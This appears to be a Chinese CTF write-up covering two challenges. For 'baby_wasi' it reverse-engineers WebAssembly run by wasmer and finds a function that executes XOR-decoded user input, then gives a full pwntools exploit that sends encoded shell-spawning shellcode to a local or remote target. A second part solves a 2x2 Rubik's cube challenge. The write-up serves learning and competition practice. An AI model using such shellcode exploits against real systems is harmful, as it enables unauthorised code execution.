将之前反编译出来的wasm.c，wasm.h，以及wabt项目内的wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h三个文件放到同一个文件夹。      
直接gcc wasm.c会报错，因为很多wasm的函数没有具体的实现。但是我们可以只编译不链接，我们关心的只是程序本身的逻辑，不需要真正编译出能运行的elf来。      
```shell    
$ gcc -c wasm.c -o wasm.o    
```
得到的还未连接的elf文件wasm.o, 将wasm.o放到ida里面分析会比较清楚一些。    
### 查找main函数    
从反编译的代码里面可以看到有_start函数,然后需要从这一堆函数里面找到关键函数...对于wasm，所有的字符串会被存放在二进制文件的末尾，而且wasm并不是直接对地址的引用，想找到这些字符串会比较困难。Nu1L的wp里面说识别出来malloc,free,exit这些函数然后才推测出来main函数的位置,我在谷歌上找到了一份保留函数名称的代码，可以对照着识别出来main函数，函数如下:    
```cpp    
static void _start(void) {    
u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0;    
FUNC_PROLOGUE;    
u32 i0, i1, i2;    
i0 = g0;    
i1 = 16u;    
i0 -= i1;    
l0 = i0;    
g0 = i0;    
__wasilibc_init_preopen();    
i0 = 3u;    
l1 = i0;    
L1:     
i0 = l1;    
i1 = l0;    
i0 = (*Z_wasi_unstableZ_fd_prestat_getZ_iii)(i0, i1);    
l2 = i0;    
i1 = 8u;    
i0 = i0 > i1;    
if (i0) {goto B0;}    
i0 = l2;    
switch (i0) {    
  case 0: goto B3;    
  case 1: goto B0;    
  case 2: goto B0;    
  case 3: goto B0;    
  case 4: goto B0;    
  case 5: goto B0;    
  case 6: goto B0;    
  case 7: goto B0;    
  case 8: goto B2;    
  default: goto B3;    
}    
B3:;    
i0 = l0;    
i0 = i32_load8_u((&memory), (u64)(i0));    
if (i0) {goto B4;}    
i0 = l0;    
i0 = i32_load((&memory), (u64)(i0 + 4));    
i1 = 1u;    
i0 += i1;    
i0 = malloc(i0);    
l2 = i0;    
i0 = !(i0);    
if (i0) {goto B0;}    
i0 = l1;    
i1 = l2;    
i2 = l0;    
i2 = i32_load((&memory), (u64)(i2 + 4));    
i0 = (*Z_wasi_unstableZ_fd_prestat_dir_nameZ_iiii)(i0, i1, i2);    
i0 = !(i0);    
if (i0) {goto B5;}    
i0 = l2;    
free(i0);    
goto B0;    
B5:;    
i0 = l2;    
i1 = l0;    
i1 = i32_load((&memory), (u64)(i1 + 4));    
i0 += i1;    
i1 = 0u;    
i32_store8((&memory), (u64)(i0), i1);    
i0 = l1;    
i1 = l2;    
i0 = __wasilibc_register_preopened_fd(i0, i1);    
l3 = i0;    
i0 = l2;    
free(i0);    
i0 = l3;    
if (i0) {goto B0;}    
B4:;    
i0 = l1;    
i1 = 1u;    
i0 += i1;    
l2 = i0;    
i1 = l1;    
i0 = i0 < i1;    
l3 = i0;    
i0 = l2;    
l1 = i0;    
i0 = l3;    
i0 = !(i0);    
if (i0) {goto L1;}    
B2:;    
i0 = l0;    
i1 = l0;    
i2 = 12u;    
i1 += i2;    
i0 = (*Z_wasi_unstableZ_environ_sizes_getZ_iii)(i0, i1);    
if (i0) {goto B8;}    
i0 = 0u;    
i1 = l0;    
i1 = i32_load((&memory), (u64)(i1));    
i2 = 2u;    
i1 <<= (i2 & 31);    
i2 = 4u;    
i1 += i2;    
i1 = malloc(i1);    
i32_store((&memory), (u64)(i0 + 1528), i1);    
i0 = l0;    
i0 = i32_load((&memory), (u64)(i0 + 12));    
i0 = malloc(i0);    
l1 = i0;    
i0 = !(i0);    
if (i0) {goto B8;}    
i0 = 0u;    
i0 = i32_load((&memory), (u64)(i0 + 1528));    
l2 = i0;    
i0 = !(i0);    
if (i0) {goto B8;}    
i0 = l2;    
i1 = l0;    
i1 = i32_load((&memory), (u64)(i1));    
i2 = 2u;    
i1 <<= (i2 & 31);    
i0 += i1;    
i1 = 0u;    
i32_store((&memory), (u64)(i0), i1);    
i0 = 0u;    
i0 = i32_load((&memory), (u64)(i0 + 1528));    
i1 = l1;    
i0 = (*Z_wasi_unstableZ_environ_getZ_iii)(i0, i1);    
if (i0) {goto B8;}    
i0 = l0;    
i1 = 12u;    
i0 += i1;    
i1 = l0;    
i0 = (*Z_wasi_unstableZ_args_sizes_getZ_iii)(i0, i1);    
if (i0) {goto B7;}    
i0 = l0;    
i0 = i32_load((&memory), (u64)(i0 + 12));    
l1 = i0;    
if (i0) {goto B10;}    
goto B9;    
B10:;    
i0 = l1;    
i1 = 2u;    
i0 <<= (i1 & 31);    
i1 = 4u;    
i0 += i1;    
i0 = malloc(i0);    
l1 = i0;    
i0 = l0;    
i0 = i32_load((&memory), (u64)(i0));    
i0 = malloc(i0);    
l2 = i0;    
i0 = l1;    
i0 = !(i0);    
if (i0) {goto B7;}    
i0 = l2;    
i0 = !(i0);    
if (i0) {goto B7;}    
i0 = l1;    
i1 = 0u;    
i32_store((&memory), (u64)(i0), i1);    
i0 = l1;    
i1 = l2;    
i0 = (*Z_wasi_unstableZ_args_getZ_iii)(i0, i1);    
if (i0) {goto B7;}    
B9:;    
__wasm_call_ctors();    
i0 = l0;    
i0 = i32_load((&memory), (u64)(i0 + 12));    
i1 = l1;    
i0 = main(i0, i1);    
l1 = i0;    
__prepare_for_exit();    
i0 = l1;    
if (i0) {goto B6;}    
i0 = l0;    
i1 = 16u;    
i0 += i1;    
g0 = i0;    
goto Bfunc;    
B8:;    
i0 = 71u;    
_Exit(i0);    
UNREACHABLE;    
B7:;    
i0 = 71u;    
_Exit(i0);    
UNREACHABLE;    
B6:;    
i0 = l1;    
_Exit(i0);    
UNREACHABLE;    
B0:;    
i0 = 71u;    
_Exit(i0);    
UNREACHABLE;    
Bfunc:;    
FUNC_EPILOGUE;    
}    
```
然后根据这个可以识别出来main函数，找到main函数以后就比较好找关键函数的位置了，关键函数如下:    
```cpp    
__int64 real_main()    
{    
unsigned int v0; // ST38_4    
unsigned int v1; // eax    
unsigned int c; // ST2C_4    
int v3; // ST30_4    
int v5; // [rsp+18h] [rbp-28h]    
unsigned int v7; // [rsp+1Ch] [rbp-24h]    
unsigned int lucky_num; // [rsp+20h] [rbp-20h]    
    
if ( ++wasm_rt_call_stack_depth > 0x1F4u )    
wasm_rt_trap(7LL);    
g0 -= 96;    
v7 = g0;    
v5 = 0;    
v0 = f28(0);    
f88(v0);    
lucky_num = (signed int)f89() % 10000;    
i32_store(&memory, v7 + 16, lucky_num);    
f40(1024LL, v7 + 16);                      // Your lucky number: %d\n    
i32_store(&memory, v7, v7 + 32);    
f69(1047u, v7);                             // %64s    
while ( v5 != 64 )    
{    
c = i32_load8_u(&memory, v5 + v7 + 32);    
v3 = get_lucky(v5 + lucky_num);    
i32_store8(&memory, v5++ + v7 + 32, v3 ^ c);    
}    
Z_envZ_boomZ_vii(v7 + 32, 64LL);              // 调用boom函数    
v1 = i32_load(&memory, 3416LL);    
f39(v1);    
g0 = v7 + 96;    
--wasm_rt_call_stack_depth;    
return 0LL;    
}    
```
f40的参数是1024,f69的参数是1047,刚好对应之前的字符串常量之间的偏移,memory的初始化如下:    
```cpp    
char *init_memory()    
{    
_QWORD *v0; // rdx    
_QWORD *v1; // rdx    
_QWORD *v2; // rdx    
_BYTE *v3; // rdi    
signed __int64 v4; // rdx    
char *result; // rax    
    
wasm_rt_allocate_memory(&memory, 2LL, 0x10000LL);    
v0 = (_QWORD *)(memory + 1024);    
*v0 = *(_QWORD *)"Your lucky number: %d\n";    
*(_QWORD *)((char *)v0 + 3060) = *(_QWORD *)&data_segment_data_0[3060];    
qmemcpy(    
(void *)((unsigned __int64)(v0 + 1) & 0xFFFFFFFFFFFFFFF8LL),    
(const void *)("Your lucky number: %d\n" - ((char *)v0 - ((unsigned __int64)(v0 + 1) & 0xFFFFFFFFFFFFFFF8LL))),    
8LL * ((((_DWORD)v0 - (((_DWORD)v0 + 8) & 0xFFFFFFF8) + 3068) & 0xFFFFFFF8) >> 3));    
v1 = (_QWORD *)(memory + 4096);    
*v1 = data_segment_data_1[0];    
v1[328] = data_segment_data_1[328];    
qmemcpy(    
(void *)((unsigned __int64)(v1 + 1) & 0xFFFFFFFFFFFFFFF8LL),    
(const void *)((char *)data_segment_data_1 - ((char *)v1 - ((unsigned __int64)(v1 + 1) & 0xFFFFFFFFFFFFFFF8LL))),    
8LL * ((((_DWORD)v1 - (((_DWORD)v1 + 8) & 0xFFFFFFF8) + 2632) & 0xFFFFFFF8) >> 3));    
v2 = (_QWORD *)(memory + 6728);    
*v2 = data_segment_data_2[0];    
*(_QWORD *)((char *)v2 + 348) = *(_QWORD *)((char *)&data_segment_data_2[43] + 4);    
v3 = (_BYTE *)((unsigned __int64)(v2 + 1) & 0xFFFFFFFFFFFFFFF8LL);    
v4 = (char *)v2 - v3;    
result = (char *)data_segment_data_2 - v4;    
qmemcpy(v3, (char *)data_segment_data_2 - v4, 8LL * ((((_DWORD)v4 + 356) & 0xFFFFFFF8) >> 3));    
return result;    
}    
```
可以看到memory + 1024中是"Your lucky number"所以可以大致猜到f40是printf函数      
然后其他的字符串偏移如下:    
```shell    
.rodata:0000000000032FC0 data_segment_data_0 db 'Your lucky number: %d',0Ah,0    
.rodata:0000000000032FC0                 ; DATA XREF: init_memory+2A↑o    
.rodata:0000000000032FD7 a64s            db '%64s',0    
.rodata:0000000000032FDC aReady          db 'Ready!!!',0    
```
memory + 1024 - 0x32FC0 + 0x32FD7 = memory + 1047,所以f69的第一个参数是"%64"，推断出f69是scanf函数。附加一些wasm中函数含义      
```cpp    
i32_store(&memory, v7 + 16, lucky_num);  // v7+16 = lucky_num    
c = i32_load8_u(&memory, v5 + v7 + 32);  // c = v5+v7+32    
v1 = i32_load(&memory, 3416LL);  //加载3416处的值到v1中    
```
### wasmer-c-api    
主程序baby_wasi加载并执行program.wasm，其中baby_wasi是使用了一些wasmer-c-api来执行wasm的，需要了解一下这些api的含义才能更好的理解程序执行过程. wasmer-c-api的手册https://docs.rs/wasmer-runtime-c-api/0.16.2/wasmer_runtime_c_api/      
找到了一个使用wasmer-c-api执行wasm的例子，对照这个例子理解一下：        
```cpp    
#include <stdio.h>    
#include "../wasmer.h"    
#include <assert.h>    
#include <stdint.h>    
#include <string.h>    
    
typedef struct {    
int32_t amount;    
int32_t value;    
} counter_data;    
    
typedef struct {    
uint8_t* bytes;    
long bytes_len;    
} wasm_file_t;    
    
wasm_file_t read_wasm_file(const char* file_name) {    
wasm_file_t wasm_file;    
    
FILE *file = fopen(file_name, "r");    
fseek(file, 0, SEEK_END);    
wasm_file.bytes_len = ftell(file);    
    
wasm_file.bytes = malloc(wasm_file.bytes_len);    
fseek(file, 0, SEEK_SET);    
fread(wasm_file.bytes, 1, wasm_file.bytes_len, file);    
fclose(file);    
    
return wasm_file;    
}    
    
void inc_counter(wasmer_instance_context_t *ctx) {    
counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx);    
data->value = data->value + data->amount;    
}    
    
void mul_counter(wasmer_instance_context_t *ctx) {    
counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx);    
data->value = data->value * data->amount;    
}    
    
int32_t get_counter(wasmer_instance_context_t *ctx) {    
counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx);    
return data->value;    
}    
    
counter_data *init_counter(int32_t value, int32_t amount) {    
counter_data* counter = malloc(sizeof(counter_data));    
counter->value = value;    
counter->amount = amount;    
return counter;    
}    
    
wasmer_import_t create_import(char* module_name, char* import_name, wasmer_import_func_t *func) {    
wasmer_import_t import;    
wasmer_byte_array module_name_bytes;    
wasmer_byte_array import_name_bytes;    
    
module_name_bytes.bytes = (const uint8_t *) module_name;    
module_name_bytes.bytes_len = strlen(module_name);    
    
import_name_bytes.bytes = (const uint8_t *) import_name;    
import_name_bytes.bytes_len = strlen(import_name);    
    
import.module_name = module_name_bytes;    
import.import_name = import_name_bytes;    
    
import.tag = WASM_FUNCTION;    
import.value.func = func;    
    
return import;    
}    
    
int main()    
{    
// Prepare Imports    
wasmer_value_tag inc_params_sig[] = {};    
wasmer_value_tag inc_returns_sig[] = {};    
//把inc_counter函数加载到wasm的env中并命名位inc    
wasmer_import_func_t *inc_func = wasmer_import_func_new((void (*)(void *)) inc_counter, inc_params_sig, 0, inc_returns_sig, 0);    
wasmer_import_t inc_import = create_import("env", "inc", inc_func);    
    
wasmer_value_tag mul_params_sig[] = {};    
wasmer_value_tag mul_returns_sig[] = {};    
//把mul_counter函数加载到wasm的env中并命名位mul    
wasmer_import_func_t *mul_func = wasmer_import_func_new((void (*)(void *)) mul_counter, mul_params_sig, 0, mul_returns_sig, 0);    
wasmer_import_t mul_import = create_import("env", "mul", mul_func);    
    
wasmer_value_tag get_params_sig[] = {};    
wasmer_value_tag get_returns_sig[] = {WASM_I32};    
//把get_counter函数加载到wasm的env中并命名位get    
wasmer_import_func_t *get_func = wasmer_import_func_new((void (*)(void *)) get_counter, get_params_sig, 0, get_returns_sig, 1);    
wasmer_import_t get_import = create_import("env", "get", get_func);    
    
// Read the wasm file    
wasm_file_t wasm_file = read_wasm_file("inc.wasm");    
    
// Compile module    
		wasmer_module_t *module = NULL;    
		wasmer_result_t compile_res = wasmer_compile(&module, wasm_file.bytes, wasm_file.bytes_len);    
		assert(compile_res == WASMER_OK);    
    
		// Prepare Import Object    
wasmer_import_object_t *import_object = wasmer_import_object_new();    
    
// First, we import `inc_counter` and `mul_counter`    
wasmer_import_t imports[] = {inc_import, mul_import};    
wasmer_result_t extend_res = wasmer_import_object_extend(import_object, imports, 2);    
assert(extend_res == WASMER_OK);    
    
// Now, we'll import `inc_counter` and `mul_counter`    
wasmer_import_t more_imports[] = {get_import};    
wasmer_result_t extend_res2 = wasmer_import_object_extend(import_object, more_imports, 1);    
assert(extend_res2 == WASMER_OK);    
    
// Same `wasmer_import_object_extend` as the first, doesn't affect anything    
wasmer_result_t extend_res3 = wasmer_import_object_extend(import_object, imports, 2);    
assert(extend_res3 == WASMER_OK);    
    
// Instantiate instance    
printf("Instantiating\n");    
wasmer_instance_t *instance = NULL;    
wasmer_result_t instantiate_res = wasmer_module_import_instantiate(&instance, module, import_object);    
printf("Compile result:  %d\n", instantiate_res);    
assert(instantiate_res == WASMER_OK);    
    
// Init counter    
counter_data *counter = init_counter(2, 5);    
wasmer_instance_context_data_set(instance, counter);    
    
wasmer_value_t result_one;    
wasmer_value_t params[] = {};    
wasmer_value_t results[] = {result_one};    
    
// 调用wast的inc_and_get函数    
wasmer_result_t call1_result = wasmer_instance_call(instance, "inc_and_get", params, 0, results, 1);    
printf("Call result:  %d\n", call1_result);    
printf("Result: %d\n", results[0].value.I32);    
    
// 调用wast的mul_and_get函数    
wasmer_result_t call2_result = wasmer_instance_call(instance, "mul_and_get", params, 0, results, 1);    
printf("Call result:  %d\n", call2_result);    
printf("Result: %d\n", results[0].value.I32);    
    
// Clear resources    
wasmer_import_func_destroy(inc_func);    
wasmer_import_func_destroy(mul_func);    
wasmer_import_func_destroy(get_func);    
wasmer_instance_destroy(instance);    
free(counter);    
free(wasm_file.bytes);    
    
return 0;    
}    
    
//inc.wast    
(module    
(func $inc (import "env" "inc"))    
(func $mul (import "env" "mul"))    
(func $get (import "env" "get") (result i32))    
    
(func (export "inc_and_get") (result i32)    
  call $inc    
  call $get)    
    
(func (export "mul_and_get") (result i32)    
  call $mul    
  call $get))    
```
然后对比着看我们的baby_wasi:    
```cpp    
v73 = wasmer_import_func_new(boom, &v56, 2LL, &v55, 0LL);    
s = "env";    
*(_QWORD *)&v54 = "env";    
DWORD2(v54) = strlen("env");    
v71 = "boom";    
v52 = "boom";    
LODWORD(v53) = strlen("boom");    
v47 = v54;    
v48 = "boom";    
v49 = v53;    
```
可以看到baby_wasi把boom函数导入了wasm的env中，然后来看一下program.wat中相应的部分:    
```shell    
(import "wasi_unstable" "fd_prestat_get" (func (;0;) (type 2)))    
(import "wasi_unstable" "fd_prestat_dir_name" (func (;1;) (type 0)))    
(import "env" "boom" (func (;2;) (type 3)))  //在这里导入了    
(import "wasi_unstable" "clock_time_get" (func (;3;) (type 4)))    
(import "wasi_unstable" "proc_exit" (func (;4;) (type 5)))    
```
在刚才找到的关键代码处:    
```cpp    
 scanf(1047u, v7);                             // %64s    
while ( v5 != 64 )    
{    
c = i32_load8_u(&memory, v5 + v7 + 32);    
v3 = get_lucky(v5 + lucky_num);    
i32_store8(&memory, v5++ + v7 + 32, v3 ^ c);    
}    
Z_envZ_boomZ_vii(v7 + 32, 64LL);  // 调用boom函数    
```
`Z_envZ_boomZ_vii`就是boom函数      
所以在对输入进行异或之后，把异或后的内容的地址作为参数调用了boom函数    
```cpp    
__int64 __fastcall boom(__int64 a1, int a2, int a3)    
{    
int v3; // ST00_4    
void *dest; // ST28_8    
__int64 v5; // rax    
const void *v6; // rsi    
    
v3 = a3;    
dest = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);    
v5 = wasmer_instance_context_memory(a1, 0LL);    
v6 = (const void *)(wasmer_memory_data(v5) + a2);    
memcpy(dest, v6, v3);    
return ((__int64 (__fastcall *)(void *, const void *))dest)(dest, v6);    
}    
```
可以看到boom函数直接执行了输入后异或的代码,简单来说就是我们输入一个长度小于64的字符串，然后程序把这个字符串异或以后执行，所以我们需要传入一段经过异或的shell，程序就可以执行这个shell了。异或的部分根据wp来看是key[i]=emirp[lucky_nubmer + i] % 256, emirp 即为反素数序列，可以参考：https://oeis.org/A006567 我们可以直接还原代码对shell异或    
### exp    
```python    
from pwn import *    
context.log_level = 'debug'    
#context.terminal=['tmux','split','-h']    
context(arch='amd64', os='linux',log_level='debug')    
debug = 1    
    
def prime_test(n):    
if n & 1 and n % 3 :    
    v3 = 7    
    while (v3 - 6) ** 2 < n:    
        if n % (v3 - 2) :    
            v1 = n % v3    
            v3 += 6    
            if v1:    
                continue    
        return 0    
    return 1    
return 0    
    
def invsere_decimal(x):    
return int(str(x)[::-1])    
    
def is_prime(x):    
v3 = invsere_decimal(x)    
if v3 != x and prime_test(x):    
    return prime_test(v3) != 0    
return False    
    
def next_prime(x):    
v3 = 0    
v4 = 0    
v5 = 0    
while v4 < x + 1:    
    v6 = is_prime(v3)    
    if v6:    
        v1 = v3    
    else:    
        v1 = v5    
    
    v5 = v1    
    v3 = v3 + 1    
    if v6:    
        v4 += 1    
return v5    
    
def payload_encode(payload, lck_n):    
print 'lck:%d' % lck_n    
rtn = ''    
for i in xrange(len(payload)):    
    c = ord(payload[i]) ^ (next_prime(lck_n) & 0xff)    
    lck_n += 1    
    rtn += chr(c)    
return rtn    
    
if debug:    
p = process('./baby_wasi')    
else:    
p = remote('121.37.164.32', 19008)    
    
def exp():    
#gdb.attach(p, 'b boom')    
p.recvuntil("Your lucky number: ")    
lckn = int(p.recv())    
#payload = '\xff' * 64    
payload = asm(shellcraft.sh())    
print "[+]payload plain: "+payload    
payload = payload_encode(payload, lckn)    
print '[+] payload len: %d' % len(payload)    
p.sendline(payload)    
p.interactive()    
    
s = raw_input('wait for gdb')    
exp()    
```

## Rubik(魔方)    
题目是Rubik加上提供了URF三种操作，所以是一个魔方题。然后魔方的状态使用最多9个字节描述，说明是一个2*2的魔方(3\*3的魔方至少需要21个字节描述)      
[在线魔方求解器](https://rubiks-cube-solver.com/2x2/)      
[OptimalSolver-Nu1L](https://github.com/hkociemba/Rubiks2x2x2-OptimalSolver)     
[py222-Helica](https://github.com/MeepMoop/py222)      
我感觉helica这个魔方求解器的逻辑要简单一些(Nu1L给的魔方求解器能求出来一些py222不能给的解法),所以我还是用了师父给的,毕竟我研究了挺久只会这个...      
### 2*2魔方简介    
首先一个标准的魔方是如下结构的：      
```shell    
   ┌──┬──┐    
   │ 0│ 1│    
   ├──┼──┤    
   │ 2│ 3│    
 ┌──┬──┼──┼──┼──┬──┬──┬──┐    
 │16│17│ 8│ 9│ 4│ 5│20│21│    
 ├──┼──┼──┼──┼──┼──┼──┼──┤    
 │18│19│10│11│ 6│ 7│22│23│    
 └──┴──┼──┼──┼──┴──┴──┴──┘    
   │12│13│    
   ├──┼──┤    
   │14│15│    
   └──┴──┘    
```
一个魔方分为UDFBRL六个面，按照上面这个标准的魔方展开图来说，891011这个面是F面，0123这个面是U面，4567这个面是R面，然后FUR这三个操作就是分别对应这三个面做顺时针旋转操作(F2指对F面顺时针旋转两次, F'指对F面逆时针旋转一次)      
### py222用法    
solver.py里面给出了求解的调用过程    
```python    
#doAlgStr(state, move)表示对处于state的魔方进行move操作    
s = py222.doAlgStr(py222.initState(), "R U2 R2 F2 R' F2 R F R")    
#打印进行上述操作后的魔方状态    
py222.printCube(s)    
#求解,输入s是一个长度为24的整数数组，    
solveCube(s)    
```
### 魔方还原    
明白是一个2*2的魔方之后，主要的难点在于给的状态并不是按照标准魔方状态给的,就是给的9字节状态，转成24长度的数组后，数组的0123位并不对于上面给的魔方标准状态的0123位置,为了还原位置我们需要记录对标准魔方分别做URF后的状态。题目中给的标准状态数字是0xB6D9246DB492249,我们在旋转魔方操作之前将表示状态的内存中的数字修改为0xB6D9246DB492249，然后分别做URF操作，记录操作后的状态    
```shell  
x /2xg addr //按照16进制打印addr处的内容(一个g是8字节)    
    
set {long}addr = 0xB6D9246DB492249 //修改addr处的内容    
```
用下面程序还原分别做URF操作后魔方的状态    
```python    
def printc(c):    
for i in range(6):    
    print("".join(str(a) for a in c[i*4:i*4+4]),end=" ")    
print("\n")    
def change_format(b):    
buf = ''    
for i in range(72):    
    buf += chr(ord('0') + bool(((1<<i) & b)))    
buf = buf[::-1]    
    
s = ''    
for i in range(len(buf)):    
    s += buf[i]    
    if i%3 == 2:    
        s += ' '    
# print(s)    
s = s.split(' ')    
t = [0] * 24    
    
for x in range(24):    
    tmp = int(s[x], 2)    
    t[x] = tmp    
return t    
print("init")    
c =  change_format(0xB6D9246DB492249)    
printc(c)    
print("after U")    
c =  change_format(0x0a4db646db912291)    
printc(c)    
print("after R")    
c =  change_format(0x900b6d8dc64b492009)    
printc(c)    
print("after F")    
c =  change_format(0x09002d924b5b4da249)    
printc(c)    
"""    
init    
0000 5555 4444 3333 2222 1111    
    
after U    
0000 5115 5544 3333 4422 1221    
    
after R    
4400 5555 4334 3113 2222 0011    
    
after F    
0220 0055 4444 5533 2332 1111    
"""    
```
根据上面的结果可以按照字符串顺序还原出这个魔方对应的状态    
```shell    
   ┌──┬──┐    
   │15│14│    
   ├──┼──┤    
   │12│13│    
 ┌──┬──┼──┼──┼──┬──┬──┬──┐    
 │ 6│ 5│22│21│17│16│ 9│ 8│    
 ├──┼──┼──┼──┼──┼──┼──┼──┤    
 │ 7│ 4│23│20│18│19│10│11│    
 └──┴──┼──┼──┼──┴──┴──┴──┘    
   │ 2│ 1│    
   ├──┼──┤    
   │ 3│ 0│    
   └──┴──┘    
```
也就是说，字符串中第0个位置对应py222给出的标准魔方的第15个位置，字符串中第1个位置对应py222给出的标准魔方的第13个位置      
然后我们根据字符的顺序，将这些字符填入它们在标准魔方中的对应位置后求解    
```python    
import py222    
import solver    
    
def change_format(a, b):    
buf = ''        
for i in range(64):    
    buf += chr(ord('0') + bool(((1<<i) & b)))    
for i in range(8):    
    buf += chr(ord('0') + bool(((1<<i) & a)))    
buf = buf[::-1]  #每三比特表示一个面的状态    
    
s = ''    
for i in range(len(buf)):    
    s += buf[i]    
    if i%3 == 2:    
        s += ' '    
print(s)    
s = s.split(' ')    
t = [0] * 24    
    
for x in range(24):    
    tmp = int(s[x], 2)    
    t[x] = tmp    
tbl = [15, 13, 12, 14, 19, 17, 16, 18, 21, 20, 22, 23, 2, 3, 1, 0, 5, 4, 6, 7, 11, 9, 8, 10]    
ns = [0] * 24    
    
for pos in range(24):    
    ns[tbl[pos]] = t[pos]    
    
return ns    
    
c =  change_format(0x22, 0x00cd0d496d3132d2)  #初始状态,第一个参数是最高字节,第二个参数是低8字节    
print(c)    
    
solver.solveCube(c)    
    
"""    
R F' R F R' F U' F'    
题目中没有定义F2,F'这些操作,F2就是FF,F'就是FFF    
"""    
```

